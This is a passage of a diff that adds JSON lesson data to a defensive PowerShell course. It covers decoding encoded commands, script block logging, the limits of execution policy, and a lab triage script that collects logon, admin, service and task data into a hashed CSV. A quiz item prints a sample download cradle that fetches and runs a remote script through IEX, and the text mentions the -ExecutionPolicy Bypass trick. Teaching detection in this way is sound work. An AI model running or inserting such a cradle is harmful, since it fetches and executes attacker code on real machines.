+     "Script block logging writes Event ID 4104 to the Microsoft-Windows-PowerShell/Operational log. It records the decoded code that actually ran. Module logging writes Event ID 4103. Turn both on through Group Policy."
+    ],
+    [
+     "Execution policy isn't security",
+     "Microsoft says execution policy isn't a security boundary. It stops accidental script runs, but anyone can bypass it, for example with -ExecutionPolicy Bypass. Don't count on it to stop attackers."
+    ]
+   ],
+   "play": {
+    "p": "Decode this encoded PowerShell command with Python. Then change the decoding to \"utf-8\" to see why UTF-16LE matters.",
+    "code": "import base64\nblob = \"RwBlAHQALQBEAGEAdABlAA==\"\nprint(base64.b64decode(blob).decode(\"utf-16-le\"))"
+   },
+   "quiz": [
+    {
+     "d": 1,
+     "q": "What is the text after -EncodedCommand?",
+     "o": [
+      "Encrypted with a secret key",
+      "Compressed with ZIP",
+      "Base64 of UTF-16LE text"
+     ],
+     "k": 2,
+     "w": "Base64 of UTF-16LE text, so anyone can decode it with no key. Not encrypted: Base64 is encoding, not encryption. Not ZIP: it isn't compressed."
+    },
+    {
+     "d": 2,
+     "q": "In these sample Event ID 4104 entries, which one is a download cradle?",
+     "code": "1: Get-ChildItem C:\\Reports -Filter *.pdf\n2: IEX (iwr 'hxxp://198.51.100.23/p.ps1' -UseBasicParsing).Content\n3: Get-Service Spooler | Restart-Service",
+     "o": [
+      "Line 1",
+      "Line 2",
+      "Line 3"
+     ],
+     "k": 1,
+     "w": "Line 2 downloads a script with iwr (Invoke-WebRequest) and runs it with IEX. Not line 1: it lists PDF files. Not line 3: it restarts the print service."
+    },
+    {
+     "d": 2,
+     "q": "A policy sets the execution policy to Restricted. Does that stop an attacker running PowerShell code?",
+     "o": [
+      "Yes, Restricted blocks all PowerShell",
+      "No, it isn't a security boundary",
+      "Yes, but only for encoded commands"
+     ],
+     "k": 1,
+     "w": "No, it isn't a security boundary. Commands can still be typed or passed with -ExecutionPolicy Bypass. Not blocking all PowerShell: Restricted only stops script files. Not encoded commands: they aren't script files either."
+    }
+   ],
+   "challenge": {
+    "p": "Fix the decoder so it prints the hidden command, whoami. It uses the wrong text encoding.",
+    "start": "import base64\nblob = \"dwBoAG8AYQBtAGkA\"\nprint(base64.b64decode(blob).decode(\"utf-8\"))",
+    "expect": "whoami",
+    "hint": "PowerShell encodes commands as UTF-16LE text before Base64.",
+    "solution": "import base64\nblob = \"dwBoAG8AYQBtAGkA\"\nprint(base64.b64decode(blob).decode(\"utf-16-le\"))"
+   },
+   "tryit": {
+    "h": "Catch your own encoded command",
+    "where": "Windows VM, elevated PowerShell",
+    "p": "Turn on script block logging in gpedit.msc (Computer Configuration > Administrative Templates > Windows Components > Windows PowerShell). Run a harmless encoded command, then find its 4104 event.",
+    "code": "$b = [Convert]::ToBase64String(\n  [Text.Encoding]::Unicode.GetBytes('Get-Date'))\npowershell -EncodedCommand $b\nGet-WinEvent -FilterHashtable @{\n  LogName='Microsoft-Windows-PowerShell/Operational'; Id=4104} -MaxEvents 5 |\n  Select-Object TimeCreated, Message",
+    "warn": "Take a snapshot of your VM first. Lab only: never run these on a work or personal computer."
+   },
+   "recap": [
+    "-EncodedCommand is Base64 of UTF-16LE text.",
+    "Decode it to see the real command.",
+    "IEX plus a download is a download cradle.",
+    "4104 logs the code that ran. Execution policy isn't a security boundary."
+   ]
+  },
+  {
+   "t": "Capstone: a lab triage report",
+   "sub": "One script, one CSV, four checks.",
+   "lang": "ps",
+   "learn": [
+    [
+     "Key terms",
+     "Triage: a quick first look to decide what needs attention.\nArray subexpression: @( ), which gathers the output of several commands into one list.\nCalculated property: a column you build yourself from other values."
+    ],
+    [
+     "What the script does",
+     "The capstone script collects four things into one CSV: failed logons, local administrators, new services and non-Microsoft scheduled tasks. Each row says which check found it."
+    ],
+    [
+     "One shape for every row",
+     "Every check outputs the same three columns: Check, TimeUtc and Detail. That keeps the CSV easy to sort and filter, whatever found the row."
+    ],
+    [
+     "Gathering it all",
+     "@( ) runs each command in turn and collects everything they output into one list. A check that finds nothing simply adds nothing."
+    ],
+    [
+     "Finish with a hash",
+     "The script ends by hashing the CSV with Get-FileHash. Write the hash in your notes, so you can show later that the report hasn't changed."
+    ]
+   ],
+   "quiz": [
+    {
+     "d": 1,
+     "q": "Why does the script add -ErrorAction SilentlyContinue to Get-WinEvent?",
+     "o": [
+      "To make the query faster",
+      "To skip events it can't read",
+      "To hide the no-match error"
+     ],
+     "k": 2,
+     "w": "To hide the no-match error. Get-WinEvent reports \"No events were found\" as an error. Not speed: it doesn't change the query. Not unreadable events: it's about having no matches."
+    },
+    {
+     "d": 1,
+     "q": "Why does every check output Check, TimeUtc and Detail?",
+     "o": [
+      "So all rows fit one CSV layout",
+      "So the file is encrypted",
+      "So PowerShell runs faster"
+     ],
+     "k": 0,
+     "w": "So all rows fit one CSV layout that's easy to sort and filter. Not encryption: CSV is plain text. Not speed: column names don't affect speed."
+    },
+    {
+     "d": 2,
+     "q": "The report lists a scheduled task called \\UpdateCheck. What should you do next?",
+     "o": [
+      "Delete it straight away",
+      "Look at what its action runs",
+      "Ignore it: tasks are normal"
+     ],
+     "k": 1,
+     "w": "Look at what its action runs, with (Get-ScheduledTask -TaskName UpdateCheck).Actions. Not deleting straight away: you'd destroy evidence and might break something legitimate. Not ignoring it: attackers use tasks for persistence."
+    }
+   ],
+   "challenge": {
+    "think": true,
+    "p": "Extend the script with a fifth check: programs in the machine-wide Run key, as rows with Check set to 'Run key'. Write the extra lines.",
+    "hint": "Get-ItemProperty returns one object with a property per entry. Get-Item gives you the entry names.",
+    "solution": "Add inside @( ): `$k = Get-Item HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run; $k.GetValueNames() | ForEach-Object { [pscustomobject]@{Check='Run key'; TimeUtc=''; Detail=\"$_ = $($k.GetValue($_))\"} }`"
+   },
+   "tryit": {
+    "h": "Run the triage report",
+    "where": "Windows VM, elevated PowerShell",
+    "p": "Save this as triage.ps1 and run it. Open the CSV, then write down the hash it prints.",
+    "code": "# Lab triage report. Run as administrator.\n$since = (Get-Date).AddDays(-1)\n$rows = @(\n  Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625; StartTime=$since} -ErrorAction SilentlyContinue |\n    ForEach-Object { [pscustomobject]@{Check='Failed logon'; TimeUtc=$_.TimeCreated.ToUniversalTime().ToString('o'); Detail=\"$($_.Properties[5].Value) from $($_.Properties[19].Value)\"} }\n  Get-LocalGroupMember -Group Administrators |\n    ForEach-Object { [pscustomobject]@{Check='Local admin'; TimeUtc=''; Detail=$_.Name} }\n  Get-WinEvent -FilterHashtable @{LogName='System'; Id=7045; StartTime=$since} -ErrorAction SilentlyContinue |\n    ForEach-Object { [pscustomobject]@{Check='New service'; TimeUtc=$_.TimeCreated.ToUniversalTime().ToString('o'); Detail=\"$($_.Properties[0].Value): $($_.Properties[1].Value)\"} }\n  Get-ScheduledTask | Where-Object TaskPath -notlike '\\Microsoft\\*' |\n    ForEach-Object { [pscustomobject]@{Check='Scheduled task'; TimeUtc=''; Detail=\"$($_.TaskPath)$($_.TaskName)\"} }\n)\nNew-Item -ItemType Directory C:\\Evidence -Force | Out-Null\n$out = \"C:\\Evidence\\triage-$(Get-Date -Format yyyyMMdd-HHmm).csv\"\n$rows | Export-Csv $out -NoTypeInformation\nGet-FileHash $out -Algorithm SHA256",
+    "warn": "Take a snapshot of your VM first. Lab only: never run these on a work or personal computer."
+   },
+   "recap": [
+    "One script can run several checks into one report.",
+    "Give every row the same columns.",
+    "@( ) gathers output from several commands.",
+    "Hash the report so you can prove it hasn't changed."
    ]
   }
  ],
